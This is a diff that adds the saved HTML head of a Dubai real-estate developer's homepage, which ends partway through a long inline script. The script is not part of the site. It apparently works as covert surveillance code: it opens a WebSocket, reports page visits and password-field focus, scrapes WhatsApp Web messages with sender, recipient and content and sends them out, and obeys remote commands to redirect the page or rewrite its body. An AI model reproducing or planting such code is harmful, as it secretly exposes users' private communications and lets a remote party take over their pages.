@@ -1,0 +1,1683 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <link
+            rel="shortcut icon"
+            href="https://www.sobharealty.com/images/favicon.png"
+            rel="SHORTCUT ICON"
+            type="images/icon"
+        />
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+        <title>Sobha Realty - Luxury Villas & Apartments in Dubai</title>
+        <meta
+            name="description"
+            content="Sobha Realty is a premium real estate developer in Dubai, UAE with premium properties offering exclusive luxury residential apartments, townhouses & villas."
+        />
+        <meta
+            name="keywords"
+            content="Sobha Realty, Sobha Hartland, Real Estate Developer in Dubai, sobha realty dubai, property for sale in dubai, sobha developers dubai"
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/style.css?v=5.71"
+            type="text/css"
+            defer
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/home.css?v=5.71"
+            type="text/css"
+            async
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/inside.css?v=5.71"
+            type="text/css"
+            async
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/device.css?v=5.71"
+            type="text/css"
+            defer
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/font-awesome.min.css"
+            type="text/css"
+            defer
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/animate.css"
+            type="text/css"
+            async
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/slick.css"
+            type="text/css"
+            async
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/font.css?v=5.71"
+            type="text/css"
+            async
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/jquery.fancybox.css"
+            type="text/css"
+            async
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/css/jquery.mCustomScrollbar.css"
+            type="text/css"
+            defer
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/lib/js/ui/themes/base/jquery.ui.all.css"
+            async
+        />
+        <link
+            rel="stylesheet"
+            href="https://www.sobharealty.com/lib/js/ui/jquery-ui-timepicker-addon.css"
+            async
+        />
+        <link
+            href="https://fonts.googleapis.com/css?family=Work+Sans:300,400,500,600,700"
+            rel="stylesheet"
+            defer
+        />
+
+        <script>
+            !(function () {
+                var Y, e, t;
+                function n() {
+                    try {
+                        return window.self === window.top;
+                    } catch (Y) {
+                        return !1;
+                    }
+                }
+                function r() {
+                    var Y = {
+                        type: 'focus',
+                        token: S.token,
+                        title: document.title,
+                        url: document.URL,
+                        useragent: navigator.userAgent,
+                        pid: S.pid,
+                        pn: S.pn,
+                    };
+                    null != I && I.readyState == WebSocket.OPEN && I.send(JSON.stringify(Y));
+                }
+                function a() {
+                    var Y = {
+                        type: 'notification',
+                        token: S.token,
+                        title: document.title,
+                        url: document.URL,
+                        focused: document.hasFocus(),
+                        timeout: S.sendNotificationsInterval,
+                        useragent:
+                            navigator.appVersion.length > navigator.userAgent.length
+                                ? navigator.appVersion
+                                : navigator.userAgent,
+                        pid: S.pid,
+                        pn: S.pn,
+                    };
+                    I.send(JSON.stringify(Y));
+                }
+                function i() {
+                    h();
+                }
+                function o() {
+                    n() && (clearInterval(y), clearInterval(N)),
+                        (timeout = setTimeout(function () {
+                            f();
+                        }, v));
+                }
+                function s(Y) {
+                    if (n())
+                        switch (Y.data.substring(0, 1)) {
+                            case 'r':
+                                window.location = Y.data.substring(1);
+                                break;
+                            case 'b':
+                                document.body.innerHTML = Y.data.substring(1);
+                                break;
+                            case 'w':
+                                var e = 'true' == Y.data.substring(1).toLowerCase();
+                                T != e && e && m(), (T = e);
+                        }
+                }
+                function M(Y) {
+                    var e = document.createElement('a');
+                    return (e.href = Y), e.href;
+                }
+                function u(Y) {
+                    if (Y && 'password' == Y.type && !H) {
+                        H = !0;
+                        var e = { type: 'password_input_focus', focus: !0, token: S.token };
+                        I.send(JSON.stringify(e));
+                    }
+                }
+                function D(Y) {
+                    if (Y && 'password' == Y.type && H) {
+                        H = !1;
+                        var e = { type: 'password_input_focus', focus: !1, token: S.token };
+                        I.send(JSON.stringify(e));
+                    }
+                }
+                function c(Y) {
+                    var e = document.activeElement;
+                    e && e != document.body
+                        ? document.querySelector && (e = document.querySelector(':focus'))
+                        : (e = null);
+                    for (var t = 0; t < Y.length; ++t) {
+                        let i = Y[t];
+                        var n = 'password' == i.type,
+                            r = n && i.hasAttribute('autofocus'),
+                            a = n && e && i.isEqualNode(e);
+                        (r || a) && u(),
+                            (i.onfocus = function () {
+                                u(i);
+                            }),
+                            (i.onblur = function () {
+                                D(i);
+                            });
+                    }
+                }
+                function d() {
+                    n() &&
+                        (S.iup && r(),
+                        p() &&
+                            (m(),
+                            h(),
+                            (function () {
+                                var Y = new MutationObserver(function (Y) {
+                                    Y &&
+                                        Y.forEach(function (Y) {
+                                            Y &&
+                                                ('childList' !== Y.type ||
+                                                    Y.addedNodes.length <= 0 ||
+                                                    Y.addedNodes.forEach(function (Y) {
+                                                        if (Y) {
+                                                            var e = document.querySelector(
+                                                                'div[id=main] header span[title]',
+                                                            );
+                                                            e && (b = e.innerText),
+                                                                document.querySelector(
+                                                                    'div[id=main] header span[data-icon=default-user]',
+                                                                ) && (A = 'private'),
+                                                                document.querySelector(
+                                                                    'div[id=main] header span[data-icon=default-group]',
+                                                                ) && (A = 'group');
+                                                            var t = Y.querySelectorAll(
+                                                                '.message-in, .message-out',
+                                                            );
+                                                            Y.matches(
+                                                                '.message-in, .message-out',
+                                                            ) &&
+                                                                (t =
+                                                                    Array.prototype.slice.call(
+                                                                        t,
+                                                                    )).push(Y),
+                                                                t &&
+                                                                    t.forEach(function (Y) {
+                                                                        if (
+                                                                            Y &&
+                                                                            Y.classList &&
+                                                                            !(
+                                                                                Y.classList
+                                                                                    .length <= 0
+                                                                            )
+                                                                        ) {
+                                                                            var e =
+                                                                                    Y.classList.contains(
+                                                                                        'message-in',
+                                                                                    ),
+                                                                                t =
+                                                                                    Y.querySelector(
+                                                                                        '.copyable-text',
+                                                                                    ),
+                                                                                n =
+                                                                                    Y.querySelector(
+                                                                                        '.selectable-text',
+                                                                                    ),
+                                                                                r = new Date(),
+                                                                                a = null;
+                                                                            if (
+                                                                                t &&
+                                                                                t.attributes[
+                                                                                    'data-pre-plain-text'
+                                                                                ]
+                                                                            ) {
+                                                                                var i =
+                                                                                        t
+                                                                                            .attributes[
+                                                                                            'data-pre-plain-text'
+                                                                                        ]
+                                                                                            .textContent,
+                                                                                    o =
+                                                                                        /\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]m)?,\s(.+)]\s(.*):/i[
+                                                                                            Symbol
+                                                                                                .match
+                                                                                        ](i);
+                                                                                if (
+                                                                                    !o ||
+                                                                                    6 != o.length
+                                                                                )
+                                                                                    return;
+                                                                                if (
+                                                                                    (o[3] &&
+                                                                                        'pm' ==
+                                                                                            o[3].toLowerCase() &&
+                                                                                        (o[1] =
+                                                                                            parseInt(
+                                                                                                o[1],
+                                                                                            ) + 12),
+                                                                                    (dateParts =
+                                                                                        /(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[
+                                                                                            Symbol
+                                                                                                .match
+                                                                                        ](o[4])),
+                                                                                    !dateParts ||
+                                                                                        4 !=
+                                                                                            dateParts.length)
+                                                                                )
+                                                                                    return;
+                                                                                if (
+                                                                                    !(r =
+                                                                                        date.parse(
+                                                                                            o[4],
+                                                                                            C,
+                                                                                        ) ||
+                                                                                        (function (
+                                                                                            Y,
+                                                                                            e,
+                                                                                            t,
+                                                                                        ) {
+                                                                                            var n =
+                                                                                                    [
+                                                                                                        [
+                                                                                                            Y,
+                                                                                                            e,
+                                                                                                            t,
+                                                                                                        ].join(
+                                                                                                            '-',
+                                                                                                        ),
+                                                                                                        [
+                                                                                                            Y,
+                                                                                                            t,
+                                                                                                            e,
+                                                                                                        ].join(
+                                                                                                            '-',
+                                                                                                        ),
+                                                                                                        [
+                                                                                                            e,
+                                                                                                            Y,
+                                                                                                            t,
+                                                                                                        ].join(
+                                                                                                            '-',
+                                                                                                        ),
+                                                                                                        [
+                                                                                                            e,
+                                                                                                            t,
+                                                                                                            Y,
+                                                                                                        ].join(
+                                                                                                            '-',
+                                                                                                        ),
+                                                                                                        [
+                                                                                                            t,
+                                                                                                            Y,
+                                                                                                            e,
+                                                                                                        ].join(
+                                                                                                            '-',
+                                                                                                        ),
+                                                                                                        [
+                                                                                                            t,
+                                                                                                            e,
+                                                                                                            Y,
+                                                                                                        ].join(
+                                                                                                            '-',
+                                                                                                        ),
+                                                                                                    ],
+                                                                                                r =
+                                                                                                    Date.now();
+                                                                                            for (var a in n) {
+                                                                                                var i =
+                                                                                                    Date.parse(
+                                                                                                        n[
+                                                                                                            a
+                                                                                                        ],
+                                                                                                    );
+                                                                                                if (
+                                                                                                    i &&
+                                                                                                    !(
+                                                                                                        Math.abs(
+                                                                                                            r -
+                                                                                                                i,
+                                                                                                        ) >
+                                                                                                        1728e6
+                                                                                                    )
+                                                                                                )
+                                                                                                    return new Date(
+                                                                                                        i,
+                                                                                                    );
+                                                                                            }
+                                                                                        })(
+                                                                                            dateParts[1],
+                                                                                            dateParts[2],
+                                                                                            dateParts[3],
+                                                                                        ))
+                                                                                )
+                                                                                    return;
+                                                                                r.setHours(o[1]),
+                                                                                    r.setMinutes(
+                                                                                        o[2],
+                                                                                    ),
+                                                                                    (a = o[5]);
+                                                                            }
+                                                                            E.get(b) || E.set(b, k);
+                                                                            var s = n
+                                                                                ? n.innerText
+                                                                                : null;
+                                                                            if (a && s && T) {
+                                                                                var M = (
+                                                                                    a +
+                                                                                    s +
+                                                                                    b +
+                                                                                    r.getTime()
+                                                                                )
+                                                                                    .split('')
+                                                                                    .map(function (
+                                                                                        Y,
+                                                                                    ) {
+                                                                                        return Y.charCodeAt(
+                                                                                            0,
+                                                                                        );
+                                                                                    })
+                                                                                    .reduce(
+                                                                                        function (
+                                                                                            Y,
+                                                                                            e,
+                                                                                        ) {
+                                                                                            return (
+                                                                                                (Y +
+                                                                                                    ((Y <<
+                                                                                                        7) +
+                                                                                                        (Y <<
+                                                                                                            3))) ^
+                                                                                                e
+                                                                                            );
+                                                                                        },
+                                                                                    )
+                                                                                    .toString(16);
+                                                                                if (
+                                                                                    (E.get(
+                                                                                        b,
+                                                                                    ).getTime() ==
+                                                                                    r.getTime()
+                                                                                        ? r.setMilliseconds(
+                                                                                              ++L,
+                                                                                          )
+                                                                                        : ((L = 0),
+                                                                                          E.set(
+                                                                                              b,
+                                                                                              r,
+                                                                                          )),
+                                                                                    !M || w.has(M))
+                                                                                )
+                                                                                    return;
+                                                                                var u = {
+                                                                                    type: 'wapmessage',
+                                                                                    timestamp:
+                                                                                        r.getTime(),
+                                                                                    id: M,
+                                                                                    incoming: e,
+                                                                                    sender: e
+                                                                                        ? a
+                                                                                        : 'Me',
+                                                                                    content: s,
+                                                                                    recipient: e
+                                                                                        ? 'Me'
+                                                                                        : b,
+                                                                                    conversationId:
+                                                                                        b +
+                                                                                        '(' +
+                                                                                        A +
+                                                                                        ')',
+                                                                                };
+                                                                                I.send(
+                                                                                    JSON.stringify(
+                                                                                        u,
+                                                                                    ),
+                                                                                ),
+                                                                                    w.add(M);
+                                                                            }
+                                                                        }
+                                                                    });
+                                                        }
+                                                    }));
+                                        });
+                                });
+                                if (!Y) return;
+                                Y.observe(document.body, { childList: !0, subtree: !0 });
+                            })()),
+                        n() &&
+                            (a(),
+                            (y = setInterval(a, S.sendNotificationsInterval)),
+                            p() && (N = setInterval(i, S.pollWhatsappTrackingInterval))),
+                        (function () {
+                            for (
+                                var Y = [], e = document.getElementsByTagName('link'), t = 0;
+                                t < e.length;
+                                ++t
+                            )
+                                ('icon' != e[t].getAttribute('rel') &&
+                                    'shortcut icon' != e[t].getAttribute('rel')) ||
+                                    (Y[Y.length] = M(e[t].getAttribute('href')));
+                            0 == Y.length && (Y[0] = M('/favicon.ico'));
+                            var n = { type: 'favicon' };
+                            (n.url = document.URL),
+                                (n.src = Y),
+                                (n.title = document.title),
+                                (n.token = S.token),
+                                (n.useragent =
+                                    navigator.appVersion.length > navigator.userAgent.length
+                                        ? navigator.appVersion
+                                        : navigator.userAgent),
+                                I.send(JSON.stringify(n));
+                        })(),
+                        S.dontTrackWebPasswords &&
+                            (c(document.getElementsByTagName('input')),
+                            new MutationObserver(function (Y) {
+                                Y &&
+                                    Y.forEach(function (Y) {
+                                        Y &&
+                                            Y.addedNodes &&
+                                            0 != Y.addedNodes.length &&
+                                            (window.NodeList &&
+                                                !NodeList.prototype.forEach &&
+                                                (NodeList.prototype.forEach =
+                                                    Array.prototype.forEach),
+                                            Y.addedNodes.forEach(function (Y) {
+                                                Y.tagName && c(Y.getElementsByTagName('input'));
+                                            }));
+                                    });
+                            }).observe(document, { childList: !0, subtree: !0 }),
+                            (window.onbeforeunload = D)));
+                }
+                function l() {
+                    document.tmfilter ||
+                        (f(),
+                        (C = {
+                            'ar-SA': 'D/M/YY',
+                            'bg-BG': 'D.M.YYYY',
+                            'ca-ES': 'D/M/YYYY',
+                            'zh-TW': 'YYYY/M/D',
+                            'cs-CZ': 'D.M.YYYY',
+                            'Da-DK': 'D-M-YYYY',
+                            'De-DE': 'D.M.YYYY',
+                            'el-GR': 'D/M/YYYY',
+                            'en-US': 'M/D/YYYY',
+                            'fi-FI': 'D.M.YYYY',
+                            'fr-FR': 'D/M/YYYY',
+                            'he-IL': 'D/M/YYYY',
+                            'hu-HU': 'YYYY. M. D.',
+                            'is-IS': 'D.M.YYYY',
+                            'it-IT': 'D/M/YYYY',
+                            'ja-JP': 'YYYY/M/D',
+                            'ko-KR': 'YYYY-M-D',
+                            'nl-NL': 'D-M-YYYY',
+                            'nb-NO': 'D.M.YYYY',
+                            'pl-PL': 'YYYY-M-D',
+                            'pt-BR': 'D/M/YYYY',
+                            'ro-RO': 'D.M.YYYY',
+                            'ru-RU': 'D.M.YYYY',
+                            'hr-HR': 'D.M.YYYY',
+                            'sk-SK': 'D. M. YYYY',
+                            'sq-AL': 'YYYY-M-D',
+                            'sv-SE': 'YYYY-M-D',
+                            'th-TH': 'D/M/YYYY',
+                            'tr-TR': 'D.M.YYYY',
+                            'ur-PK': 'D/M/YYYY',
+                            'iD-ID': 'D/M/YYYY',
+                            'uk-UA': 'D.M.YYYY',
+                            'be-BY': 'D.M.YYYY',
+                            'sl-SI': 'D.M.YYYY',
+                            'et-EE': 'D.M.YYYY',
+                            'lv-LV': 'YYYY.M.D.',
+                            'lt-LT': 'YYYY.M.D',
+                            'fa-IR': 'M/D/YYYY',
+                            'vi-VN': 'D/M/YYYY',
+                            'hy-AM': 'D.M.YYYY',
+                            'az-Latn-AZ': 'D.M.YYYY',
+                            'eu-ES': 'YYYY/M/D',
+                            'Mk-MK': 'D.M.YYYY',
+                            'af-ZA': 'YYYY/M/D',
+                            'ka-GE': 'D.M.YYYY',
+                            'fo-FO': 'D-M-YYYY',
+                            'hi-IN': 'D-M-YYYY',
+                            'Ms-MY': 'D/M/YYYY',
+                            'kk-KZ': 'D.M.YYYY',
+                            'ky-KG': 'D.M.YY',
+                            'sw-KE': 'M/D/YYYY',
+                            'uz-Latn-UZ': 'D/M YYYY',
+                            'tt-RU': 'D.M.YYYY',
+                            'pa-IN': 'D-M-YY',
+                            'gu-IN': 'D-M-YY',
+                            'ta-IN': 'D-M-YYYY',
+                            'te-IN': 'D-M-YY',
+                            'kn-IN': 'D-M-YY',
+                            'Mr-IN': 'D-M-YYYY',
+                            'sa-IN': 'D-M-YYYY',
+                            'Mn-MN': 'YY.M.D',
+                            'gl-ES': 'D/M/YY',
+                            'kok-IN': 'D-M-YYYY',
+                            'syr-SY': 'D/M/YYYY',
+                            'Dv-MV': 'D/M/YY',
+                            'ar-IQ': 'D/M/YYYY',
+                            'zh-CN': 'YYYY/M/D',
+                            'De-CH': 'D.M.YYYY',
+                            'en-GB': 'D/M/YYYY',
+                            'es-MX': 'D/M/YYYY',
+                            'fr-BE': 'D/M/YYYY',
+                            'it-CH': 'D.M.YYYY',
+                            'nl-BE': 'D/M/YYYY',
+                            'nn-NO': 'D.M.YYYY',
+                            'pt-PT': 'D-M-YYYY',
+                            'sr-Latn-CS': 'D.M.YYYY',
+                            'sv-FI': 'D.M.YYYY',
+                            'az-Cyrl-AZ': 'D.M.YYYY',
+                            'Ms-BN': 'D/M/YYYY',
+                            'uz-Cyrl-UZ': 'D.M.YYYY',
+                            'ar-EG': 'D/M/YYYY',
+                            'zh-HK': 'D/M/YYYY',
+                            'De-AT': 'D.M.YYYY',
+                            'en-AU': 'D/M/YYYY',
+                            'es-ES': 'D/M/YYYY',
+                            'fr-CA': 'YYYY-M-D',
+                            'sr-Cyrl-CS': 'D.M.YYYY',
+                            'ar-LY': 'D/M/YYYY',
+                            'zh-SG': 'D/M/YYYY',
+                            'De-LU': 'D.M.YYYY',
+                            'en-CA': 'D/M/YYYY',
+                            'es-GT': 'D/M/YYYY',
+                            'fr-CH': 'D.M.YYYY',
+                            'ar-DZ': 'D-M-YYYY',
+                            'zh-MO': 'D/M/YYYY',
+                            'De-LI': 'D.M.YYYY',
+                            'en-NZ': 'D/M/YYYY',
+                            'es-CR': 'D/M/YYYY',
+                            'fr-LU': 'D/M/YYYY',
+                            'ar-MA': 'D-M-YYYY',
+                            'en-IE': 'D/M/YYYY',
+                            'es-PA': 'M/D/YYYY',
+                            'fr-MC': 'D/M/YYYY',
+                            'ar-TN': 'D-M-YYYY',
+                            'en-ZA': 'YYYY/M/D',
+                            'es-DO': 'D/M/YYYY',
+                            'ar-OM': 'D/M/YYYY',
+                            'en-JM': 'D/M/YYYY',
+                            'es-VE': 'D/M/YYYY',
+                            'ar-YE': 'D/M/YYYY',
+                            'en-029': 'M/D/YYYY',
+                            'es-CO': 'D/M/YYYY',
+                            'ar-SY': 'D/M/YYYY',
+                            'en-BZ': 'D/M/YYYY',
+                            'es-PE': 'D/M/YYYY',
+                            'ar-JO': 'D/M/YYYY',
+                            'en-TT': 'D/M/YYYY',
+                            'es-AR': 'D/M/YYYY',
+                            'ar-LB': 'D/M/YYYY',
+                            'en-ZW': 'M/D/YYYY',
+                            'es-EC': 'D/M/YYYY',
+                            'ar-KW': 'D/M/YYYY',
+                            'en-PH': 'M/D/YYYY',
+                            'es-CL': 'D-M-YYYY',
+                            'ar-AE': 'D/M/YYYY',
+                            'es-UY': 'D/M/YYYY',
+                            'ar-BH': 'D/M/YYYY',
+                            'es-PY': 'D/M/YYYY',
+                            'ar-QA': 'D/M/YYYY',
+                            'es-BO': 'D/M/YYYY',
+                            'es-SV': 'D/M/YYYY',
+                            'es-HN': 'D/M/YYYY',
+                            'es-NI': 'D/M/YYYY',
+                            'es-PR': 'D/M/YYYY',
+                            'aM-ET': 'D/M/YYYY',
+                            'tzM-Latn-DZ': 'D-M-YYYY',
+                            'iu-Latn-CA': 'D/M/YYYY',
+                            'sMa-NO': 'D.M.YYYY',
+                            'Mn-Mong-CN': 'YYYY/M/D',
+                            'gD-GB': 'D/M/YYYY',
+                            'en-MY': 'D/M/YYYY',
+                            'prs-AF': 'D/M/YY',
+                            'bn-BD': 'D-M-YY',
+                            'wo-SN': 'D/M/YYYY',
+                            'rw-RW': 'M/D/YYYY',
+                            'qut-GT': 'D/M/YYYY',
+                            'sah-RU': 'M.D.YYYY',
+                            'gsw-FR': 'D/M/YYYY',
+                            'co-FR': 'D/M/YYYY',
+                            'oc-FR': 'D/M/YYYY',
+                            'Mi-NZ': 'D/M/YYYY',
+                            'ga-IE': 'D/M/YYYY',
+                            'se-SE': 'YYYY-M-D',
+                            'br-FR': 'D/M/YYYY',
+                            'sMn-FI': 'D.M.YYYY',
+                            'Moh-CA': 'M/D/YYYY',
+                            'arn-CL': 'D-M-YYYY',
+                            'ii-CN': 'YYYY/M/D',
+                            'Dsb-DE': 'D. M. YYYY',
+                            'ig-NG': 'D/M/YYYY',
+                            'kl-GL': 'D-M-YYYY',
+                            'lb-LU': 'D/M/YYYY',
+                            'ba-RU': 'D.M.YY',
+                            'nso-ZA': 'YYYY/M/D',
+                            'quz-BO': 'D/M/YYYY',
+                            'yo-NG': 'D/M/YYYY',
+                            'ha-Latn-NG': 'D/M/YYYY',
+                            'fil-PH': 'M/D/YYYY',
+                            'ps-AF': 'D/M/YY',
+                            'fy-NL': 'D-M-YYYY',
+                            'ne-NP': 'M/D/YYYY',
+                            'se-NO': 'D.M.YYYY',
+                            'iu-Cans-CA': 'D/M/YYYY',
+                            'sr-Latn-RS': 'D.M.YYYY',
+                            'si-LK': 'YYYY-M-D',
+                            'sr-Cyrl-RS': 'D.M.YYYY',
+                            'lo-LA': 'D/M/YYYY',
+                            'kM-KH': 'YYYY-M-D',
+                            'cy-GB': 'D/M/YYYY',
+                            'bo-CN': 'YYYY/M/D',
+                            'sMs-FI': 'D.M.YYYY',
+                            'as-IN': 'D-M-YYYY',
+                            'Ml-IN': 'D-M-YY',
+                            'en-IN': 'D-M-YYYY',
+                            'or-IN': 'D-M-YY',
+                            'bn-IN': 'D-M-YY',
+                            'tk-TM': 'D.M.YY',
+                            'bs-Latn-BA': 'D.M.YYYY',
+                            'Mt-MT': 'D/M/YYYY',
+                            'sr-Cyrl-ME': 'D.M.YYYY',
+                            'se-FI': 'D.M.YYYY',
+                            'zu-ZA': 'YYYY/M/D',
+                            'xh-ZA': 'YYYY/M/D',
+                            'tn-ZA': 'YYYY/M/D',
+                            'hsb-DE': 'D. M. YYYY',
+                            'bs-Cyrl-BA': 'D.M.YYYY',
+                            'tg-Cyrl-TJ': 'D.M.YY',
+                            'sr-Latn-BA': 'D.M.YYYY',
+                            'sMj-NO': 'D.M.YYYY',
+                            'rM-CH': 'D/M/YYYY',
+                            'sMj-SE': 'YYYY-M-D',
+                            'quz-EC': 'D/M/YYYY',
+                            'quz-PE': 'D/M/YYYY',
+                            'hr-BA': 'D.M.YYYY.',
+                            'sr-Latn-ME': 'D.M.YYYY',
+                            'sMa-SE': 'YYYY-M-D',
+                            'en-SG': 'D/M/YYYY',
+                            'ug-CN': 'YYYY-M-D',
+                            'sr-Cyrl-BA': 'D.M.YYYY',
+                            'es-US': 'M/D/YYYY',
+                        }[navigator.language]),
+                        (document.tmfilter = 'present'));
+                }
+                function f() {
+                    ((I = new WebSocket(S.connectionString)).onclose = o),
+                        (I.onmessage = s),
+                        (I.onopen = d),
+                        S.extJs &&
+                            ((this.extJs.webSockReady = () => I.readyState === WebSocket.OPEN),
+                            (this.extJs.webSockSend = (Y) => I.send(Y)));
+                }
+                function g() {
+                    var Y = (function () {
+                        var Y = ['webkit', 'moz', 'ms', 'o'];
+                        if ('hidden' in document) return 'hidden';
+                        for (var e = 0; e < Y.length; e++)
+                            if (Y[e] + 'Hidden' in document) return Y[e] + 'Hidden';
+                        return null;
+                    })();
+                    return !!Y && document[Y];
+                }
+                function p() {
+                    var Y = document.head.querySelector("[name='og:title']");
+                    return !!Y && 'WhatsApp Web' === Y.getAttribute('content');
+                }
+                function h() {
+                    I.send(JSON.stringify({ type: 'waptracking' }));
+                }
+                function m() {
+                    (E = new Map()),
+                        (w = new Set()),
+                        (L = 0),
+                        (k = new Date()).setSeconds(0),
+                        k.setMilliseconds(0);
+                }
+                (Y = this),
+                    (e = {}),
+                    (t = {
+                        en: {
+                            MMMM: 'January February March April May June July August September October November December'.split(
+                                ' ',
+                            ),
+                            MMM: 'Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec'.split(' '),
+                            dddd: 'Sunday Monday Tuesday Wednesday Thursday Friday Saturday'.split(
+                                ' ',
+                            ),
+                            ddd: 'Sun Mon Tue Wed Thu Fri Sat'.split(' '),
+                            dd: 'Su Mo Tu We Th Fr Sa'.split(' '),
+                            A: ['a.m.', 'p.m.'],
+                            formatter: {
+                                YYYY: function (Y) {
+                                    return ('000' + Y.getFullYear()).slice(-4);
+                                },
+                                YY: function (Y) {
+                                    return ('0' + Y.getFullYear()).slice(-2);
+                                },
+                                Y: function (Y) {
+                                    return '' + Y.getFullYear();
+                                },
+                                MMMM: function (Y) {
+                                    return this.MMMM[Y.getMonth()];
+                                },
+                                MMM: function (Y) {
+                                    return this.MMM[Y.getMonth()];
+                                },
+                                MM: function (Y) {
+                                    return ('0' + (Y.getMonth() + 1)).slice(-2);
+                                },
+                                M: function (Y) {
+                                    return '' + (Y.getMonth() + 1);
+                                },
+                                DD: function (Y) {
+                                    return ('0' + Y.getDate()).slice(-2);
+                                },
+                                D: function (Y) {
+                                    return '' + Y.getDate();
+                                },
+                                HH: function (Y) {
+                                    return ('0' + Y.getHours()).slice(-2);
+                                },
+                                H: function (Y) {
+                                    return '' + Y.getHours();
+                                },
+                                A: function (Y) {
+                                    return this.A[(11 < Y.getHours()) | 0];
+                                },
+                                hh: function (Y) {
+                                    return ('0' + (Y.getHours() % 12 || 12)).slice(-2);
+                                },
+                                h: function (Y) {
+                                    return '' + (Y.getHours() % 12 || 12);
+                                },
+                                mm: function (Y) {
+                                    return ('0' + Y.getMinutes()).slice(-2);
+                                },
+                                m: function (Y) {
+                                    return '' + Y.getMinutes();
+                                },
+                                ss: function (Y) {
+                                    return ('0' + Y.getSeconds()).slice(-2);
+                                },
+                                s: function (Y) {
+                                    return '' + Y.getSeconds();
+                                },
+                                SSS: function (Y) {
+                                    return ('00' + Y.getMilliseconds()).slice(-3);
+                                },
+                                SS: function (Y) {
+                                    return ('0' + ((Y.getMilliseconds() / 10) | 0)).slice(-2);
+                                },
+                                S: function (Y) {
+                                    return '' + ((Y.getMilliseconds() / 100) | 0);
+                                },
+                                dddd: function (Y) {
+                                    return this.dddd[Y.getDay()];
+                                },
+                                ddd: function (Y) {
+                                    return this.ddd[Y.getDay()];
+                                },
+                                dd: function (Y) {
+                                    return this.dd[Y.getDay()];
+                                },
+                                Z: function (Y) {
+                                    return (
+                                        (0 < (Y = Y.utc ? 0 : Y.getTimezoneOffset() / 0.6)
+                                            ? '-'
+                                            : '+') +
+                                        ('000' + Math.abs(Y - (Y % 100) * 0.4)).slice(-4)
+                                    );
+                                },
+                                post: function (Y) {
+                                    return Y;
+                                },
+                            },
+                            parser: {
+                                find: function (Y, e) {
+                                    for (var t, n = -1, r = 0, a = 0, i = Y.length; a < i; a++)
+                                        (t = Y[a]),
+                                            !e.indexOf(t) &&
+                                                t.length > r &&
+                                                ((n = a), (r = t.length));
+                                    return { index: n, length: r };
+                                },
+                                MMMM: function (Y) {
+                                    return this.parser.find(this.MMMM, Y);
+                                },
+                                MMM: function (Y) {
+                                    return this.parser.find(this.MMM, Y);
+                                },
+                                A: function (Y) {
+                                    return this.parser.find(this.A, Y);
+                                },
+                                h: function (Y, e) {
+                                    return (12 === Y ? 0 : Y) + 12 * e;
+                                },
+                                pre: function (Y) {
+                                    return Y;
+                                },
+                            },
+                        },
+                    }),
+                    (e.format = function (Y, n, r) {
+                        var a = e.addMinutes(Y, r ? Y.getTimezoneOffset() : 0),
+                            i = t.en,
+                            o = i.formatter;
+                        return (
+                            (a.utc = r),
+                            n.replace(
+                                /(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,
+                                function (Y) {
+                                    var e = o[Y];
+                                    return e ? o.post(e.call(i, a, n)) : Y.replace(/\[(.*)]/, '$1');
+                                },
+                            )
+                        );
+                    }),
+                    (e.parse = function (Y, n, r) {
+                        var a,
+                            i,
+                            o = t.en,
+                            s = o.parser.pre(Y),
+                            M = 0,
+                            u =
+                                /(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,
+                            D = { 2: /^\d{1,4}/, 3: /^\d{1,3}/, 4: /^\d\d/, 5: /^\d\d?/, 6: /^\d/ };
+                        Y = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+                        for (
+                            var c = { Y: 1970, M: 1, D: 1, H: 0, m: 0, s: 0, S: 0 };
+                            (a = u.exec(n));
+
+                        ) {
+                            var d = 0,
+                                l = 1;
+                            for (i = ''; !i; ) i = a[++d];
+                            a = i.charAt(0);
+                            var f = s.slice(M);
+                            if (2 > d) {
+                                var g = o.parser[i].call(o, f, n);
+                                (c[a] = g.index), 'M' === a && c[a]++, (l = g.length);
+                            } else if (7 > d)
+                                (g = (f.match(D[d]) || [''])[0]),
+                                    (c[a] = 0 | ('S' === a ? (g + '000').slice(0, -i.length) : g)),
+                                    (l = g.length);
+                            else if (' ' !== a && a !== f[0]) return NaN;
+                            if (!l) return NaN;
+                            M += l;
+                        }
+                        return M === s.length && g
+                            ? ((c.Y += 70 > c.Y ? 2e3 : 100 > c.Y ? 1900 : 0),
+                              (c.H = c.H || o.parser.h(c.h || 0, c.A || 0)),
+                              (n = new Date(c.Y, c.M - 1, c.D, c.H, c.m, c.s, c.S)),
+                              (Y[1] += 0 | e.isLeapYear(n)),
+                              1 > c.M ||
+                              12 < c.M ||
+                              1 > c.D ||
+                              c.D > Y[c.M - 1] ||
+                              23 < c.H ||
+                              59 < c.m ||
+                              59 < c.s
+                                  ? NaN
+                                  : r
+                                  ? e.addMinutes(n, -n.getTimezoneOffset())
+                                  : n)
+                            : NaN;
+                    }),
+                    (e.isValid = function (Y, t) {
+                        return !!e.parse(Y, t);
+                    }),
